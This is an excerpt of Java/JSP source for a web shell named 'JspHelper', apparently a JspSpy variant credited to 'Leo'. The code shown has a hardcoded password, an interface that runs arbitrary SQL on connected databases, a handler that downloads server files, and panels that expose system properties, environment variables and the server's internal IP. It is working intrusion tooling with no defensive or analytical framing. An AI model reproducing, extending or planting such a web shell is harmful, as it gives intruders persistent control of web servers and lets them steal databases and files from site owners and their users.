...
* ReCode By Leo
* Date 2010-10-10
* Suit for Chinese Characterset.
* QQ 33771000
*/
private static final String PW = "admin.com"; //password
private static final String PW_SESSION_ATTRIBUTE = "SpyPwd";
...
try {
PrintWriter out = response.getWriter();
out.println("<html><head><title>JspHelper Codz By - Leo</title><style type=\"text/css\">"+
...
" <option value='sun.jdbc.odbc.JdbcOdbcDriver`jdbc:odbc:Driver={Microsoft Access Driver (*.mdb)};DBQ=C:\\Leo.mdb'>Access</option>"+
...
"<p><input type=\"hidden\" name=\"selectDb\" value=\""+selectDb+"\"><input type=\"hidden\" name=\"o\" value=\"executesql\"><table width=\"200\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr><td colspan=\"2\">Run SQL query/queries on database :</td></tr><tr><td><textarea name=\"sql\" class=\"area\" style=\"width:600px;height:50px;overflow:auto;\">"+Util.getStr(sql)+"</textarea></td><td style=\"padding:0 5px;\"><input class=\"bt\" style=\"height:50px;\" name=\"submit\" type=\"submit\" value=\"Query\" /></td></tr></table></p></form></table>");	
} catch (Exception e) {
//e.printStackTrace();
throw e;
}
...
try {
PrintWriter out = response.getWriter();
String sql = new String(request.getParameter("sql").getBytes("GBK"));
...
"	  "+
"<span style=\"font:11px Verdana;\">Copyright &copy; 2010 Leo </span><a href=\"http://www.baidu.com\" target=\"_blank\">www.baidu.com</a></p>"+
"    </form>");
} catch (Exception e) {
e.printStackTrace();
throw e ;
...
public void invoke(HttpServletRequest request,HttpServletResponse response,HttpSession JSession) throws Exception{
try {
response.getWriter().println("<div style=\"padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;\">Copyright (C) 2009 <a href=\"http://www.baidu.com\" target=\"_blank\">http://www.baidu.com/</a> All Rights Reserved."+
"</div>");
} catch (Exception e) {
e.printStackTrace();
throw e ;
...
if (!f.exists()) 
return;
response.setHeader("Content-Disposition","attachment;filename="+URLEncoder.encode(f.getName(),"GBK"));
...
out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\">"+
"      <tr>"+
"        <td><h2 id=\"Leo_H2_Title\">System Properties &gt;&gt;</h2>"+
"          <div id=\"ghaB\">"+
"            <hr style=\" border: 1px solid #ddd;height:0px;\"/>"+
"            <ul id=\"Leo_Ul_Sys\" class=\"info\">");
...
out.println("</ul><h2 id=\"Leo_H2_Mac\">System Environment &gt;&gt;</h2><hr style=\" border: 1px solid #ddd;height:0px;\"/><ul id=\"Leo_Ul_Sys\" class=\"info\">");
...
"	<tr class=\"head\">"+
"		<td><span style=\"float:right;\"><a href=\"http://www.baidu.com\" target=\"_blank\">JspHelper Ver: 2010</a></span>"+request.getHeader("host")+" ("+InetAddress.getLocalHost().getHostAddress()+")</td>"+
"	</tr>"+
"	<tr class=\"alt1\">"+
